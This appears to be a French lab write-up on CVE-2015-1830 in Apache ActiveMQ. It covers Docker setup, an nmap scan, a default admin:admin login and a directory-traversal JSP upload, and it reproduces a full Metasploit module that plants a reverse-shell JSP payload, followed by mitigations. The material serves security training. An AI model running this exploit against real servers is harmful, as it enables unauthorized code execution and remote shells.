
## Configuration de l'environnement ActiveMQ 2015

**Résumé des commandes**
1. **Naviguer vers le dossier `activemq_2015`** 
   ```bash
   cd activemq_2015
   ```

2. **Lancer le conteneur Docker**  
   ```bash
   docker-compose up -d
   ```
   Cette commande démarre le service ActiveMQ en mode détaché.

   **Résultat attendu** :
   ```
   Starting activemq_2015_activemq_1 … done
   ```

3. **Lister les conteneurs Docker actifs**  
   ```bash
   docker container ls
   ```
   Cette commande permet de vérifier que le conteneur `ActiveMQ` est bien en cours d'exécution.

4. **Récupérer l'adresse IP du conteneur**  
   ```bash
   ip a
   ```
   Cette commande affiche la configuration réseau pour identifier l'adresse IP.

---

## Scan réseau de ActiveMQ_2015

- **Adresse IP identifiée** : `172.18.0.1`
- **Scan de ports** : Un scan réseau révèle les ports ouverts pour les services hébergés sur cette adresse IP.

   ```bash
   nmap 172.18.0.* -p 1-65535
   ```
   - **Ports d'intérêt** :
     - **8161** (pour la console Web ActiveMQ)

![image](https://github.com/user-attachments/assets/49432dad-490a-48c9-b75f-e277eca6a155)

---

## Accéder à la console ActiveMQ

Après avoir identifié l’adresse IP et les ports ouverts, accédez à l’interface web d’ActiveMQ :

1. **Naviguer vers** : [http://localhost:8161](http://localhost:8161)
2. **Identifiants de connexion** :
   - **Nom d’utilisateur** : `admin`
   - **Mot de passe** : `admin`

### Informations sur la version d’ActiveMQ

- La **version d’ActiveMQ** peut être confirmée sur le tableau de bord principal après connexion. Dans ce cas :
   - **Version** : `5.11.1`

![image](https://github.com/user-attachments/assets/6300e7ce-e65e-44b9-8863-4d216855a9c9)

---

## Vulnérabilité CVE : CVE-2015-1830

![image](https://github.com/user-attachments/assets/f64dcd7c-b2d5-48f5-b3f7-de13290ad4c1)

### Détails de la vulnérabilité
- **Description** : Une vulnérabilité de type "traversée de répertoire" dans la fonctionnalité de téléchargement/téléversement de fichiers pour les messages blob dans ActiveMQ (versions 5.x avant 5.11.2) sur Windows permet aux attaquants distants de créer des fichiers JSP dans des répertoires arbitraires.
- **Impact** : Les attaquants peuvent potentiellement exécuter du code malveillant en créant des fichiers dans des répertoires non sécurisés.
- **Score CVSS** : 5.0 (Moyen)

---

### Stratégie d’exploitation

1. **Objectif** : Exploiter la vulnérabilité de traversée de répertoire pour obtenir un accès non autorisé ou exécuter du code arbitraire.
2. **Approche** :
   - Exploiter la fonctionnalité de téléversement de messages blob pour placer des fichiers JSP malveillants dans des répertoires sensibles.
   - Utiliser des requêtes spécialement conçues pour manipuler les chemins de fichiers et éventuellement exécuter du code à distance sur des systèmes Windows vulnérables avec ActiveMQ en version inférieure à 5.11.2.

---

# Stratégie de Compromission

## Code d'exploitation Metasploit pour ActiveMQ

```ruby
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache
        ActiveMQ 5.x before 5.11.2 for Windows.

        The module tries to upload a JSP payload to the /admin directory via the traversal
        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
        credentials admin:admin (or other credentials provided by the user). It then issues
        an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the
        payload and obtain a shell.
      },
      'Author'          =>
        [
          'David Jorm',     # Discovery and exploit
          'Erik Wynter'     # @wyntererik - Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2015-1830' ],
          [ 'EDB', '40857'],
          [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]
        ],
      'Privileged'     => false,
      'Platform'    => %w{ win },
      'Targets'     =>
        [
          [ 'Windows Java',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'win'
            }
          ],
        ],
      'DisclosureDate' => '2015-08-19',
      'License'        => MSF_LICENSE,
      'DefaultOptions'  => {
        'RPORT' => 8161,
        'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
      OptString.new('PATH',      [true, 'Traversal path', '/fileserver/..\\admin\\']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])
    ])
  end

  def check
    print_status("Running check...")
    testfile = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'GET'
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
          'headers'     => {
            'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
            },
          'method'    => 'DELETE'
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testfile = Rex::Text::rand_text_alpha(10)
    vprint_status("If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => payload.encoded
    })

    print_status("Payload sent. Attempting to execute the payload.")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      },
      'method'    => 'GET'
    })
    if res && res.code == 200
      print_good("Payload executed!")
    else
      fail_with(Failure::PayloadFailed, "Failed to execute the payload")
    end
  end
end
          
---

## Mesures de sécurité

Pour atténuer cette vulnérabilité :
1. **Mettre à jour ActiveMQ** : Assurez-vous qu’ActiveMQ est mis à jour vers la version 5.11.2 ou une version plus récente pour éviter l’exposition à la CVE-2015-1830.
2. **Sécurité réseau** : Restreignez l’accès à la console de gestion ActiveMQ en appliquant des règles de réseau ou des configurations de pare-feu.
3. **Contrôle d’accès** : Utilisez des mots de passe forts pour la console d'administration ActiveMQ et évitez les identifiants par défaut.


---
